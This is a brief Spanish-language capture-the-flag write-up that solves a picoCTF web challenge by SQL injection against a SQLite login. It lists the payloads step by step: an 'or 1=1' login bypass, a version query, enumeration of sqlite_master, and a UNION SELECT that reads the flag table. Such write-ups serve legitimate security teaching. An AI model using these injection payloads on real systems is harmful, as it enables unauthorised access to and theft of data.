## Descripción
Can you find the flag on this website. Try to find the flag [here](http://saturn.picoctf.net:49442/).
## Solución

```
Para este reto se debe de profundizar en algunas otras funciones de inyección SQL, para empezar, entramos al login con este usuario y contraseña:
admin' or 1=1;
Ahora, podemos ver una pista que es: SQLite, entonces podemos buscar la versión en la que estamos con:
UNION SELECT sqlite_version()
y con este nos permite ver la estructura de las tablas:
hola' union select 1, sql, tbl_name FROM sqlite_master;
finalmente, ya sabiendo esto, podemos ver cual tabla contiene la flag para poder verla: 
'union select 1, id, flag from more_table'
La flag se nos mostrará en pantalla
```


## Notas adicionales
- podemos ayudarnos con documentación de sql para resolver este reto.
- no funcionó con sqlite_schema pero lo intentamos también con ese.
## Referencias